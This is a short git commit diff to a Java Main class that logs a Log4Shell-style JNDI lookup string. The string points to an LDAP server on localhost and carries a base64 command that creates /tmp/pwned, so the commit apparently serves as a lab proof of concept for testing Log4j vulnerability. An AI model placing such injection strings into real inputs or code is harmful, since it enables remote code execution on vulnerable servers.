109849dc5fefe4c1a6a0911ada22fe1f26c9cfe1
Dobrosi Andras <dobrosi.andras@hmei.hu>
2021-12-14 19:44:00 +0100

    fix

--- src/main/java/Main.java
+++ src/main/java/Main.java
@@ -2,9 +2,10 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 public class Main {
-    private static final Logger logger = LogManager.getLogger("HelloWorld");
+  private static final Logger logger = LogManager.getLogger("HelloWorld");
 
-    public static void main(String[] args) {
-        logger.info("Create /tmp/pwned file Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo this row.");
-    }
+  public static void main(String[] args) {
+    logger.info(
+        "Created /tmp/pwned file. ${jndi:ldap://localhost:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}");
+  }
 }
